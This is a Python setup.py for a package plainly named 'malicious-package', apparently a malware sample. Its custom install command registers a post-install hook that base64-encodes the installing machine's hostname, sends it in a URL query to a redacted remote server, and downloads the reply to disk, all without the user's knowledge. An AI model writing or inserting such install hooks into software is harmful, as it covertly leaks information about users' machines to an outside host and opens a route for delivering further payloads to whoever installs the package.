import atexit
import socket
import urllib
import base64
import os

from setuptools import setup, find_packages
from setuptools.command.install import install


def _post_install():
    hostname = base64.b64encode(socket.getfqdn().encode()).decode()
    url = f'https://[REDACTED]/image.png?{hostname}'
    destination = os.path.join(os.path.dirname(__file__), 'image.png')
    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:
        data = response.read()
        out_file.write(data)


class CustomInstallCommand(install):
    def __init__(self, *args, **kwargs):
        super(CustomInstallCommand, self).__init__(*args, **kwargs)
        atexit.register(_post_install)


setup(
    name='malicious-package',
    version='1.0.0',
    author='[REDACTED]',
    author_email='[REDACTED]',
    description='[REDACTED]',
    packages=find_packages(),
    cmdclass={
        'install': CustomInstallCommand,
    },
)
